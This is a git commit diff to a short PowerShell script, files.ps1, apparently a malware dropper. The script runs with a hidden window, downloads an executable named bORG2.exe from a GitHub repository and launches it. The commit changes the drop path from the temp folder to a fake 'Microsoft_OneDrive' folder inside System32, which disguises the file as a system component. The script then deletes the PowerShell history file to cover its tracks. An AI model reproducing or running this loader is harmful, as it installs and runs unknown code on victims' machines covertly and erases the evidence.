a8764d634c047e20d3c12c40a877c5f2f8a973d3
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-14 20:23:20 -0600

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,5 +1,5 @@
-powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:TMP\bORG2.exe
-start-process "$env:TMP\bORG2.exe"
+powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:SystemRoot\System32\Microsoft_OneDrive\BQ\bORG2.exe
+start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\bORG2.exe"
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
